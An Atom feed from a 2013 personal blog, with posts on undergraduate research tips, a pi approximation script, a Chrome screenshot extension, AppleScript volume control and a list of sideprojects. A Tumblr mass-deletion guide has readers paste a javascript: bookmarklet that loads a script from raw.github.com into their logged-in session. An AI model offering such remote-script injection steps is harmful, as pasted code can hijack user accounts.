<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Louis Li]]></title>
  <link href="http://louisrli.github.io/atom.xml" rel="self"/>
  <link href="http://louisrli.github.io/"/>
  <updated>2013-07-16T19:14:50-04:00</updated>
  <id>http://louisrli.github.io/</id>
  <author>
    <name><![CDATA[Louis Li]]></name>
    <email><![CDATA[louisrli@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Five Research Tips for First-Time Undergraduate Researchers]]></title>
    <link href="http://louisrli.github.io/blog/2013/06/28/researchtips/"/>
    <updated>2013-06-28T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/06/28/researchtips</id>
    <content type="html"><![CDATA[<p>Today, I submitted my first extended abstract to the ASSETS 2013 Student Research Competition. This marks my first tangible output in undergraduate research. This isn&rsquo;t quite the end of the story &mdash; I plan to continue gathering results and writing a paper for submission to CHI. It is, however, time for reflection.</p>

<!-- more -->


<p>My research endeavors (in human-computer interaction) have been an incredible learning experience. In this post, I want to talk about some of the more <em>practical</em>, elementary lessons that I learned about the research process. These are mostly time-saving lessons. Unfortunately, I missed a lot of these lessons when I did medical research in high school. My sincerest hope is that another undergraduate researcher, working on his or her first research project, will stumble upon this post and save some valuable time.</p>

<p><strong>I have no doubt that grad students and experienced researchers know these already &mdash; these are for first-time lead researchers.</strong> Or, if you&rsquo;re a grad student or Ph.D that disagrees with anything below, feel free to impart your wisdom by correcting or qualifying it (I place a lot of weight on the wisdom of the ancients &mdash; not that you&rsquo;re ancient&hellip;).</p>

<h3>1. Design and analysis: Find answers in the results and methods sections</h3>

<p>Research papers aren&rsquo;t only valuable for their graphs and conclusions. Chances are, there are similarly designed experiments floating around on Google Scholar (what papers are in your literature review?).</p>

<p>Although I initially relied on asking others, I found that consulting past work is an excellent way of finding answers to questions yourself. These include answers to questions like:</p>

<ul>
<li>What statistical analyses do others usually employ on experiments of similar design?</li>
<li>How do others exclude outliers?</li>
<li>How did others run experiments that had similar conditions?</li>
<li>What metric is usually used to present errors in clicking tasks?</li>
</ul>


<p>And many more. I still discussed my various approaches with other people before moving forward to make sure that I wasn&rsquo;t misinterpreting the papers, but if you&rsquo;re ever feeling <em>clueless</em> about anything, check the literature first.</p>

<h3>2. Data Collection: If your data is simple, just store it as CSV</h3>

<p>Really, just store it as CSV. <strong>Every data analysis application accepts CSV</strong>, and it saves time from parsing to store the raw results as CSV.</p>

<p>I went through a few iterations of data storage. First, I stored things in a MySQL database. Having interned at a database company last summer, the thought of appending my data to a plaintext file was horrifying.</p>

<p>I soon realized, however, that the overhead of storing, retrieving, and quickly inspecting values in a database was more trouble than it was worth. I opted to store my results (time, error, trajectory, detailed mouse logs, questionnaires &mdash; each with associated metadata) as JSON files, which made the logs easy to quickly inspect. Since I used MATLAB (more on that later) and JMP for analysis, I eventually parsed this JSON into numpy/MATLAB matrices, and finally, just CSV files. Oops!</p>

<p>Before you start gathering data, envision yourself processing the data. Keep in mind that you&rsquo;ll most likely want to process your data as tables.</p>

<p>The caveat is that CSV isn&rsquo;t too good at handling more complex data with parent-child relationships (though you could stringify lists into a cell).</p>

<h3>3. Communication: Make it easy for your PI</h3>

<p>Professors have a reputation for being busy, though my PI (research advisor) is receptive to meeting if I need it. One thing that I quickly learned is that meetings go much more smoothly if I make it easy for him. More concretely: <strong>when possible, I should generate ideas and present them to him for feedback, rather than having him do the heavy lifting.</strong></p>

<p>After all, your PI is helping <em>you</em>, so he or she deserves your best effort to make the process less painful. These include things like being ready for meetings. At first, our meetings were pretty disorganized, but I learned that it&rsquo;s a good idea to write up a very specific list of topics beforehand. This ensured that the meetings ran smoothly: demo, receive feedback, iterate through questions and discussion points, talk about next steps.</p>

<h3>4. Data Analysis: Don&rsquo;t use MATLAB for statistical analysis</h3>

<p>For some reason (the reason being that I was only familiar with MATLAB and Excel for analysis), I thought it was a good idea to use MATLAB for doing statistical analysis and making graphs. While MATLAB has a statistics toolbox and graphing functionality, it&rsquo;s not great for playing around with data and generating graphs quickly.</p>

<p>The choice of program is personal preference &mdash; or in my case, inheritance. After spending an embarrassing amount of time grouping my data in MATLAB, I watched my PI replicate my work in five minutes using the Graph Builder in JMP. I ended up using JMP, and I really like it. The Graph Builder is wonderful. The documentation is okay (MATLAB has great documentation).</p>

<p>There are a lot of options &mdash; R, Stata, SPSS. I tried both SPSS and JMP. My initial impressions is that SPSS has a pretty bad user experience, while JMP&rsquo;s workflow seems better thought out (though minor things could be improved).</p>

<p>An auxiliary lesson is that it&rsquo;s worth asking a grad student, postdoc, or PI about their workflow before beginning an endeavor. Unfortunately, the ones in my group work in a different office and weren&rsquo;t immediately accessible, but I&rsquo;ll definitely ask if I find myself in a new situation.</p>

<h3>5. Graphing for papers: Excel is a good option</h3>

<p>There&rsquo;s graphing for the purpose of playing with data, then there&rsquo;s graphing for the purpose of producing a good looking PDF.</p>

<p>For the latter, I found that neither JMP nor MATLAB would let me style my graphs with the flexibility and speed that I wanted. One of the postdocs said that she used R or Excel. Excel was actually a very good option, since I just wanted to change the fonts, size, and bar labels. Lesson: with all the fancy tools, don&rsquo;t forget about Excel.</p>

<p>I suspect Python might have some good graphing libraries, although the only one that I&rsquo;ve used is <code>matplotlib</code>, which was basically MATLAB. It&rsquo;s also possible to create graphs directly in TeX, although I would guess that it&rsquo;s harder to iterate on the styling.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sophomore Spring: A Brief List of What I Learned]]></title>
    <link href="http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester/"/>
    <updated>2013-05-13T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester</id>
    <content type="html"><![CDATA[<p>Here&rsquo;s a concise list of [some of] the things that I learned this semester. I would say that the things that I learned this semester are a lot more diverse than those from last semester (I&rsquo;d describe last semester as&hellip;math).</p>

<h2>Research</h2>

<p>(I work in an HCI research group).</p>

<p><strong>Demo or die</strong>.</p>

<p><strong>Experimental design in HCI</strong> is very similar to experimental design in psychology. HCI is human-computer interaction; psychology is human interaction.</p>

<!-- more -->


<p><strong>What does my advisor do in his day-to-day life?</strong> As an HCI professor, he is a master of experimental design. As an advisor, his day is often filled with meetings, colloquia, and proposals. I wonder when he finds time to hack on something or put together a project (but amazingly, he manages to do it).</p>

<p><strong>What is the life of a grad student like?</strong> They seem to have a lot of time to code things. They attend a lot of talks, possibly looking for inspiration?</p>

<p>Group meeting is very insightful.</p>

<p>I&rsquo;ve known, but now better understand, the concept of <strong>programming as a tool.</strong> The person reading your paper doesn&rsquo;t care about your code, your backend, or your choice of framework.</p>

<h2>Programming Languages</h2>

<p>The class could be titled <em>Programming Languages Theory</em>, since it&rsquo;s an introductory class. I think students who haven&rsquo;t taken it and aren&rsquo;t familiar with the field aren&rsquo;t too sure what topics to expect.</p>

<p>What is programming language (PL) theory? Here&rsquo;s a meme-style joke that I usually think of when someone asks me what it is:</p>

<p>What students outside of computer science think:
: &ldquo;Oh, so you learn how to program in a lot of different programming languages.&rdquo;</p>

<p>What computer science students unfamiliar with PL think (myself included at the time):
: &ldquo;You do something formal with programming languages. You prove things about them. Or something like that.&rdquo;</p>

<p>What it really is:
: &ldquo;Logic and inference rules. Induction. Semantics and types. More inference rules. Models.&rdquo;</p>

<p>There is a lot more to the field, but that&rsquo;s what was packed into the introductory course.</p>

<p>There also seem to be a lot of ways to teach a PL course. From looking at other resources on the internet, a lot of professors choose to make the whole course closely follow some programming language, and all concepts are taught with applications. I think I prefer the approach in my course, where the first half was purely theory and the second half mixed theory with code.</p>

<h2>Computational Linguistics</h2>

<p>Lambda-calculus has applications in grammars and quantifiers!</p>

<p>I actually gained a good understanding of the problems in natural language processing. It was a good class for breadth, and my final project, which tackled <a href="http://en.wikipedia.org/wiki/Word-sense_disambiguation">word sense disambiguation</a>, was pretty interesting.</p>

<p>Prolog is interesting. I&rsquo;m pretty impressed by how easy it is to build a basic parser in Prolog.</p>

<h2>Rover</h2>

<p><strong>Clients don&rsquo;t care about the technical details.</strong> Don&rsquo;t make excuses, get things done, and translate them to the appropriate nontechnical language.</p>

<p><strong>Keep communicating with the client.</strong> Just as you would <a href="http://online.wsj.com/article/SB122511931313072047.html">manage up</a> with your boss, go out of your way to maintain a good relationship with clients.</p>

<h2>Development</h2>

<p>Javascript frameworks seem to be the new thing. Client-side frameworks for single page web applications make a lot of sense though, reducing the unnecessary overhead of maintaining the server. I&rsquo;d definitely like to try <a href="http://meteor.com">Meteor</a>. No jQuery spaghetti.</p>

<p>That being said, a <em>lot</em> more experience with web development this semester through my research project. If I could go back, I would have used a Javascript framework (but that&rsquo;s what the first major project in a language is for!).</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Up-to-date Guide on How to Delete All Posts on Your Tumblr]]></title>
    <link href="http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts/"/>
    <updated>2013-05-11T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts</id>
    <content type="html"><![CDATA[<p>One of my friends asked me how to batch delete all of the posts on a <a href="http://tumblr.com">Tumblr</a>. There are some PHP and Ruby scripts on the internet that claim to achieve this, but they seem to be outdated in regards to the Tumblr API, or they require installing some packages.</p>

<!-- more -->


<h2>Instructions</h2>

<p>This will allow you to delete 100 posts at a time. Unfortunately, if you try more, Tumblr will give you a warning that only 100 posts can be edited at one time.</p>

<ol>
<li>On the right side of the Tumblr dashboard, click <strong>Posts</strong> underneath the name of your blog.</li>
<li>This should bring up a link called <strong>Mass Post Editor</strong>. Click on <strong>Mass Post Editor</strong>.</li>
<li>You&rsquo;ll be presented with your posts as tiles. <strong>Keep scrolling down</strong> until at least 100 posts (eyeball it) appear on the screen.</li>
<li><p>Paste the code snippet below in the URL bar. There will be no visible changes. <strong>NOTE:</strong> Some browsers will remove the <code>javascript:</code> in front of it. Double check that it&rsquo;s still there, and if not, type <code>javascript:</code> at the beginning of the pasted part.</p>

<pre><code>  javascript:if(!window.protolicious)(function(d,s){s=d.createElement('script');s.src='https://raw.github.com/kangax/protolicious/master/event.simulate.js';(d.head||d.documentElement).appendChild(s)})(document); 
</code></pre></li>
<li><p>Paste the code snippet below in the URL bar. It should select the first 100 posts with checkmarks.</p>

<pre><code>  javascript:$$('.overlay').slice(0, 100).each(function(a) { a.simulate('click'); }); 
</code></pre></li>
<li><p>Click <strong>Delete selected posts</strong>.</p></li>
<li>Refresh the page if needed, and delete another 100 posts!</li>
</ol>


<p>If for some reason this doesn&rsquo;t work, let me know in the comments. I&rsquo;ll try to keep this up-to-date.</p>

<h2>Technical Details</h2>

<p>Tumblr uses the Javascript library <a href="http://prototypejs.org/">Prototype</a>. Unlike jQuery, this doesn&rsquo;t provide a lot of support for handling and simulating events, so we load some library (I&rsquo;m not familiar with Prototype, although I briefly read the docs out of curiosity) called <a href="https://github.com/kangax/protolicious">Protolicious</a> that adds some support for this.</p>

<p>Prototype is already included on the page, since Tumblr uses it. The code loads the Protolicious library, finds the first 100 posts, and clicks on them.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Rational Approximation of Pi Using the Pigeonhole Principle]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle/"/>
    <updated>2013-01-31T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle</id>
    <content type="html"><![CDATA[<p>Below is a short Python script that finds a fractional approximation of \(\pi\) using the first 1001 multiples of \(\pi\) (the case with 11 multiples of \(\pi\) can easily be done by hand). It makes use of the <em>pigeonhole principle</em>. The 11-multiple version of the problem has been used in the module teaching the pigeonhole principle in various classes that I have taken or taught.</p>

<p>The <a href="http://en.wikipedia.org/wiki/Pigeonhole_principle">pigeonhole principle</a> states that:</p>

<blockquote><p>If \(n > m\) and \(n\) pigeons are placed in \(m \) pigeonholes, then one pigeonhole must contain more than one pigeon.</p></blockquote>

<!-- more -->


<h2>Problem and Solution</h2>

<blockquote><p>Given the following multiples of \(\pi\), each truncated to four decimal places:</p>

<p>\(0\pi = 0.0000, 1\pi = 3.1415, 2\pi = 6.2831, &hellip; 1001\pi = 3144.7342 \)</p>

<p>Use the pigeonhole principle to find a good rational approximation to \(\pi\).</p></blockquote>

<p>If we are given the multiples \(0 \pi \) through \( 1000 \pi \), we have 1001 multiples of \(0 \pi \). Consider the first three digits to the right of the decimal place of a number (in 123.456, the digits 456).</p>

<p>There are only 1000 possibilities for the first three digits to the right of the decimal place. Given 1001 multiples of \(\pi \), we can conclude from the pigeonhole principle that two such multiples must have the same three digits. This means that the difference to the right of the decimal point them is less than 0.001 in absolute value (for example, \(0.1235 &ndash; 0.1230 = 0.005\)).</p>

<p>Let \(m \pi, n \pi, m > n \) be two multiples sharing the three numbers to the right of the decimal place. Then:</p>

<p>$$ m\pi &ndash; n\pi = (m &ndash; n) \pi \implies \pi = \frac{m \pi &ndash; n \pi}{m &ndash; n} $$</p>

<p>Because \( m\pi &ndash; n\pi \) has a difference to the right of the decimal place that is less than 0.001, it approximates some integer. Therefore, we can use \( \frac{m \pi &ndash; n \pi}{m &ndash; n} \) as a rational approximation of \pi.</p>

<h2>Code</h2>

<p>For 11 multiples of \( \pi \), the problem is trivial to do by hand. For 1001 multiples, I&rsquo;ve written a Python script to solve the problem. You can play around with the code <a href="http://codepad.org/HCmovMEd">here</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">pi.py</span>
</span><span class='line'><span class="sd">Calculates an approximation of pi given the multiples 0pi - 1000pi using</span>
</span><span class='line'><span class="sd">the Pigeonhole Principle. Outputs the first approximation found.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">Author: Louis Li</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">math</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="c"># Store the decimals we&#39;ve found in a dictionary with its multiple of pi</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1001</span><span class="p">):</span>
</span><span class='line'>        <span class="n">n_pi</span> <span class="o">=</span> <span class="n">n</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">pi</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">first_three_dec</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">((</span><span class="n">n_pi</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1000</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">first_three_dec</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>            <span class="n">d</span><span class="p">[</span><span class="n">first_three_dec</span><span class="p">]</span> <span class="o">=</span> <span class="n">n</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="c"># Calculate an approximation, having found two numbers</span>
</span><span class='line'>            <span class="c"># with the same first three decimal places</span>
</span><span class='line'>            <span class="n">m</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">first_three_dec</span><span class="p">]</span>
</span><span class='line'>            <span class="n">m_pi</span> <span class="o">=</span> <span class="n">m</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">pi</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">print</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">n_pi</span> <span class="o">-</span> <span class="n">m_pi</span><span class="p">))</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;----- = &quot;</span><span class="p">,</span> <span class="p">((</span><span class="n">n_pi</span> <span class="o">-</span> <span class="n">m_pi</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="n">m</span><span class="p">)),</span> \
</span><span class='line'>                <span class="s">&quot;(m = </span><span class="si">%d</span><span class="s">, n = </span><span class="si">%d</span><span class="s">)&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Actual value, pi: &quot;</span><span class="p">,</span> <span class="n">math</span><span class="o">.</span><span class="n">pi</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will output the first solution found:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>355
</span><span class='line'>----- =  3.14159265359 (m = 1, n = 114)
</span><span class='line'>113
</span><span class='line'>
</span><span class='line'>Actual value, pi:  3.14159265359
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Chrome Extensions: Taking Screenshots with Javascript/jQuery, HTML5, Canvas]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot/"/>
    <updated>2013-01-16T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot</id>
    <content type="html"><![CDATA[<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>

<ol>
<li>How can we take a screenshot of the current page using Javascript?</li>
<li>Given the screenshot of part of the page, how can we crop out our element from the screenshot?</li>
</ol>


<!-- more -->


<p>If you&rsquo;re only interested in the code and not the explanation of the problem, <a href="#code">click here</a>.</p>

<h2>Overview</h2>

<h3>The screenshot problem: imperfect solutions</h3>

<p>Given only plain Javascript and a DOM, outside of the context of a Chrome extension it&rsquo;s not possible to take a completely accurate screenshot of the page. This is explained in a <a href="http://stackoverflow.com/questions/4912092/using-html5-canvas-javascript-to-take-screenshots/">Stack Overflow question</a>.</p>

<p>The top answer offers a solution that uses a script called <a href="http://html2canvas.hertzen.com/">html2canvas</a>. Another potential solution is <a href="http://www.aplweb.co.uk/blog/js/magnifying-glass/">Magnifying Glass</a>, which works by duplicating the HTML content of the body and re-rendering it in a &ldquo;magnifying glass&rdquo; (<a href="http://www.aplweb.co.uk/blog/js/magnifying-glass/demo.html">demo</a>). However, Magnifying Glass will conflict with any HTML-embedded Javascript, and html2canvas produces an imperfect replication of the page.</p>

<p>The solution in this post is dependent on the fact that the Chrome extension API provides a function, <code>chrome.tabs.captureVisibleTab()</code> <a href="http://developer.chrome.com/extensions/tabs.html#method-captureVisibleTab">(docs)</a>, for taking a screenshot of the visible part of a tab.</p>

<h3>Picking out the element from the screenshot</h3>

<p>Since the <code>captureVisibleTab()</code> function only gives us a portion of the screen, we can&rsquo;t simply use the offset (top, left) of the rendered element.</p>

<p>For example, in the figure below, let the shaded part of the screen be the part of the screen that we capture, and the <strong>Message Passing</strong> header, boxed in yellow, be the element that we want to capture. Given the position of the screenshot relative to the origin of the window (the black dots), we&rsquo;ll compute the position of our element relative to the origin of the screenshot (the blue dots), then crop out that region.</p>

<ul class="thumbnails" style="text-align: center;">
    <li class="span6" style="display:inline-block; float: none;">
    <a href="http://louisrli.github.io/images/chrome-screenshot-demo.png" class="thumbnail">
        <img src="http://louisrli.github.io/images/chrome-screenshot-demo.png"
    alt="Diagram of the element that we want to capture relative to the screenshot"/>
    </a>
    </li>
</ul>


<h2>Code</h2>

<p>Chrome extensions have two distinct parts involving Javascript: the extension (runs in the background) and the content scripts (runs on a certain page and can access the DOM). Content scripts <em>cannot</em> access most of the Chrome extension API (such as <code>captureVisibleTab()</code>), but extensions and content scripts can communicate indirectly through <a href="http://developer.chrome.com/extensions/messaging.html">message passing</a>.</p>

<p>Make sure that these permissions are included in your <code>manifest.json</code>, and add the functions to one of your content scripts.</p>

<div>
  <pre><code class='text'>&quot;permissions&quot;: [&quot;tabs&quot;, &quot;&lt;all_urls&gt;&quot;],
&quot;background&quot;: {
    &quot;scripts&quot;: [&quot;background.js&quot;]
},</code></pre>
</div>


<p><code>background.js</code>:</p>

<div>
  <pre><code class='javascript'>chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.name == 'screenshot') {
        chrome.tabs.captureVisibleTab(null, null, function(dataUrl) {
            sendResponse({ screenshotUrl: dataUrl });
        });
    }
    return true;
});</code></pre>
</div>


<p><code>screenshot.js</code> (content script):</p>

<div>
  <pre><code class='javascript'>/* Takes a screenshot and uses it in a callback as a canvas */
takeScreenshot: function(callback) {
    chrome.extension.sendMessage({name: 'screenshot'}, function(response) {
        var data = response.screenshotUrl;
        var canvas = document.createElement('canvas');
        var img = new Image();
        img.onload = function() {
            canvas.width = $(window).width();
            canvas.height = $(window).height()
            canvas.getContext(&quot;2d&quot;).drawImage(img, 0, 0, canvas.width, canvas.height);

            var $canvas = $(canvas);
            $canvas.data('scrollLeft', $(document.body).scrollLeft());
            $canvas.data('scrollTop', $(document.body).scrollTop());

            // Perform callback after image loads
            callback($canvas);
        }
        img.src = data;
    });
}</code></pre>
</div>




<div>
  <pre><code class='javascript'>/* Returns a canvas containing a screenshot of $element */
renderPreview: function($element, $screenshotCanvas) {
    var previewCanvas = document.createElement('canvas');
    previewCanvas.width = $element.width();
    previewCanvas.height = $element.height();

    // Calculate the correct position of the element on the canvas
    var prevTop = $element.offset().top - $screenshotCanvas.data('scrollTop');
    var prevLeft = $element.offset().left - $screenshotCanvas.data('scrollLeft');

    var ctx = previewCanvas.getContext(&quot;2d&quot;);
    ctx.drawImage($screenshotCanvas[0], prevLeft, prevTop,
                                        $element.width(), $element.height(),
                                        0, 0,
                                        $element.width(), $element.height());

    return $(previewCanvas)
                .css({ border:'1px solid black' });
}</code></pre>
</div>


<p>We do three things:</p>

<ol>
<li>Use the extension to capture a screenshot of the open tab, receiving a <code>data://</code> URL to the image and sending it to the content script.</li>
<li>In the content script, scale down the screenshot by drawing it to a canvas. The original image may be higher resolution than the actual window, so it needs to be scaled.</li>
<li>Crop out the portion of the screenshot canvas that we need onto another canvas, now containing our element.</li>
</ol>


<p>We add a listener in the background script of the extension. When a screenshot is requested, it will take a screenshot and send back the <code>data://</code> URL.</p>

<p>Our content script will take two functions. One takes a screenshot of the page, and it accepts a callback argument after the screenshot has finished. When the screenshot is taken, we encode the current position of the window using jQuery&rsquo;s <code>scrollLeft()</code> and <code>scrollTop()</code>.</p>

<p>Our second function takes a jQuery element and returns a jQuery object referring to a canvas with the preview of that element. It computes the position of the element on the canvas. We use the version of <code>drawImage()</code> <a href="https://developer.mozilla.org/en-US/docs/HTML/Canvas/Tutorial/Using_images#Slicing">(docs)</a> with the most parameters.</p>

<p>If this helped, feel free to leave and comment and let me know.</p>

<h2>Finished product</h2>

<p>It&rsquo;s up to you what you want to use the screenshots of the elements for, but here&rsquo;s an example of what the screenshots would look like in click-and-cross:</p>

<ul class="thumbnails" style="text-align: center;">
    <li class="span3" style="display:inline-block; float: none;">
    <a href="http://louisrli.github.io/images/chrome-nyt-plain.png" class="thumbnail">
        <img src="http://louisrli.github.io/images/chrome-nyt-plain.png"
    alt="Diagram of the element that we want to capture relative to the screenshot"/>
    </a>
    <div>A page with multiple links</div>
    </li>
    <li class="span3" style="display:inline-block; float: none;">
    <a href="http://louisrli.github.io/images/chrome-nyt-cnx.png" class="thumbnail">
        <img src="http://louisrli.github.io/images/chrome-nyt-cnx.png"
    alt="Diagram of the element that we want to capture relative to the screenshot"/>
    </a>
    <div>Previews of nearby elements</div>
    </li>

</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Quicksilver Mac and AppleScript to Adjust System Volume]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/15/applescript-volume/"/>
    <updated>2013-01-15T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/15/applescript-volume</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I&rsquo;d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>&ndash;<code>f12</code> map to the normal keys.</p>

<p>It seems that there&rsquo;s actually no Quicksilver plugin for system volume &mdash; only iTunes volume &mdash; but it&rsquo;s pretty simple to do with AppleScripts. It&rsquo;s not documented everywhere, so I thought I&rsquo;d add it here.</p>

<!-- more -->




<ul class="thumbnails" style="width: 50%; margin: 0px auto;">
<li class="span4">
<a href="http://louisrli.github.io/images/quicksilver-script.png" class="thumbnail">
<img alt="Quicksilver script for increasing volume" src="http://louisrli.github.io/images/quicksilver-script.png" height="300"/>
</a>
</li>
</ul>


<h2>Volume AppleScripts</h2>

<p>The AppleScripts below will adjust the system volume, which is measured on a scale of 0 &ndash; 100. Here&rsquo;s a <a href="https://www.dropbox.com/s/8a3rzqtiyupmny1/volume-applescripts.zip">download link</a> for these three scripts. To use them in Quicksilver, add them to the catalog, and opening them in Quicksilver should run them by default.</p>

<h5>Decrease volume</h5>

<div>
  <pre><code class='applescript'># Decrease\ Volume.scpt
set currentVolume to output volume of (get volume settings)
set volume output volume (currentVolume - 10)</code></pre>
</div>


<h5>Increase volume</h5>

<div>
  <pre><code class='applescript'># Increase\ Volume.scpt
set currentVolume to output volume of (get volume settings)
set volume output volume (currentVolume + 10)</code></pre>
</div>


<h5>Mute volume</h5>

<div>
  <pre><code class='applescript'># Mute\ Volume.scpt
set isMuted to output muted of (get volume settings)
set volume output muted not isMuted</code></pre>
</div>


<h2>Using in command line</h2>

<p>To run an AppleScript file in the command line, run:</p>

<div>
  <pre><code class='console'>$ osascript /path/to/file</code></pre>
</div>


<p>These files have spaces in them so that it looks cleaner in Quicksilver, but you can alias the commands appropriately.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2012 in Sideprojects]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
    <updated>2013-01-12T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
    <content type="html"><![CDATA[<p>It always surprises me how long a year is. It&rsquo;s hard for me to believe that some of these projects were a year ago, but I&rsquo;m happy to see my progress. Here&rsquo;s a walk down memory lane for my projects in 2012, not including course projects and research.</p>

<p><a id="exploits" style="visibility:hidden;"> </a></p>

<h3>Exploit Exercises: Protostar, Nebula</h3>

<p>Description
: A series of security wargames from <a href="http://exploit-exercises.com">Exploit Exercises</a>.</p>

<p>Languages &amp; Tools
: shell, C, assembly and shellcode, command line tools, compilation and libraries</p>

<p>Other
: These were both fun and educational. These problems required a good deal of persistence. Topics ranged from: buffer overflows, shell code, stack layout, library linking, race conditions, format strings, command line tools, networking. I&rsquo;ve posted the solutions on this site for the format string, stack, and shell exploit sections.</p>

<p>Links
: <a href="http://louisrli.github.com/sideprojects/2012/06/22/nebula0">Nebula shell solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/18/protostar-stack0">Protostar stack solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/29/protostar-format0">Protostar format solutions</a></p>

<!-- more -->


<p><a id="euler" style="visibility:hidden;"> </a></p>

<h3>Project Euler</h3>

<p>Description
: A series of mathematical programming problems from <a href="http://projecteuler.net/">Project Euler</a>.</p>

